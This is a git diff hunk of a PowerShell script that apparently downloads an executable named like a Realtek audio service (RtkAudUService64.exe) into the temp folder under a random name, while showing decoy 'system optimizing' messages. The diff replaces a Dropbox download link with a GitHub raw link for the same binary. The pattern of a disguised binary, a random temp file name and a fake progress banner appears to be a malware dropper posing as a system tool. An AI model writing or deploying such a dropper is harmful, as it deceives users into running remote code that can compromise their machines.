@@ -87,7 +87,7 @@ try {
     
     $rnd = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
     $exe = "$env:TEMP\$rnd.exe"
-    $url = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
+    $url = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/exe/refs/heads/main/RtkAudUService64.exe"
     
     Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
     Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
